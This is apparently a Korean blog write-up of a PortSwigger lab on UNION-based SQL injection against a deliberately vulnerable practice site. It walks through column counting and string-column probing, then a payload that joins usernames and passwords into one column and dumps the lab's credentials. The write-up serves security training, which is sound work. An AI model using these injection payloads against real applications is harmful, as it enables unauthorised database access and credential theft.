+++
date = '2026-05-21T10:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - SQL injection UNION attack, retrieving multiple values in a single column'
summary = "문자열 컬럼이 하나뿐인 상황에서 문자열 연결 연산자로 username과 password를 하나의 컬럼에 합쳐 조회하는 PortSwigger 랩 풀이"
toc = true
tags = ["SQL Injection", "UNION-Based", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

> ![image.png](/writeup/portswigger/sqli/08/1.png)

Product Category Filter에 SQL Injection이 존재하며, 쿼리 결과가 응답에 포함되어 UNION attack이 가능하다.  
`users` 테이블의 `username` 과 `password` 값을 추출하면 되며, 문제 이름에서 알 수 있듯 하나의 컬럼에 여러 값을 담아 출력하는 것이 핵심이다.

### SQL Injection 진단

앞선 랩들과 마찬가지로 PostgreSQL로 추정하고, 먼저 컬럼 개수를 파악한다.

```sql
' ORDER BY 3--
```

`ORDER BY 3` 에서 오류가 발생하므로 컬럼의 개수는 2개로 파악된다.  
이어서 UNION으로 문자열과 호환되는 컬럼의 위치를 찾는다.

```sql
' UNION SELECT NULL,'a'--
```

두 번째 컬럼에서 문자열이 오류 없이 반환되므로, 두 번째 컬럼에 원하는 값을 출력할 수 있음을 확인했다.

---

## 익스플로잇

문자열을 출력할 수 있는 컬럼이 하나뿐이므로 `username` 과 `password` 를 각각 다른 컬럼에 담을 수 없다.  
따라서 PostgreSQL의 문자열 연결 연산자 `||` 를 사용해 두 값을 구분자 `:` 와 함께 하나의 문자열로 합쳐 두 번째 컬럼에 출력한다.

```sql
' UNION SELECT NULL,username||':'||password FROM users--
```

응답은 다음과 같다.

```
carlos:r63r6gvyqupvvdl2dquo
wiener:vtijwewzll1dsm1ab1r5
administrator:v1s1wcrfrykyyycdxq1w
```

이 중 administrator 계정 정보로 로그인하면 문제가 해결된다.

![image.png](/writeup/portswigger/sqli/08/2.png)

---

## 정리

문자열을 표시할 수 있는 컬럼 수가 조회하려는 값의 개수보다 적을 때, 문자열 연결 연산자를 이용해 여러 값을 하나의 컬럼에 합쳐 조회할 수 있다.  
이때 `:` 같은 구분자를 함께 넣어 값의 경계를 구분한다. 문자열 연결 문법은 DB마다 달라, PostgreSQL·Oracle은 `||`, MySQL은 `CONCAT()`, Microsoft SQL Server는 `+` 를 사용한다. DB별 문법은 이론 노트의 치트시트에서 정리한 바 있다.